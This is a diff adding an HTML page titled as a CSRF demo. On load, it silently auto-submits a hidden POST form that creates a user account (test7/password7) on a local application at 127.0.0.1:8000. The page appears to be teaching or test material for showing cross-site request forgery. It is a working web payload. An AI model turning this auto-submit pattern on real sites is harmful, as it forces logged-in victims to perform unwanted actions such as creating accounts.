@@ -1,0 +1,14 @@
+<html>
+  <head>
+    <title>CSRF demo using HTML form</title>
+  </head>
+  <body onload="document.formcsrf.submit();">
+    <h2>CSRF demo using HTML form</h2>
+    <form name="formcsrf" action="http://127.0.0.1:8000/users/" method="POST">
+      <input type="hidden" id="login"    name="login"    value="test7"><br/>
+      <input type="hidden" id="password" name="password" value="password7"><br/>
+      <input type="hidden" id="fullname" name="fullname" value="Test 7 User"><br/><br/>
+      <input type="submit" value="Create user">
+    </form>
+  </body>
+</html>
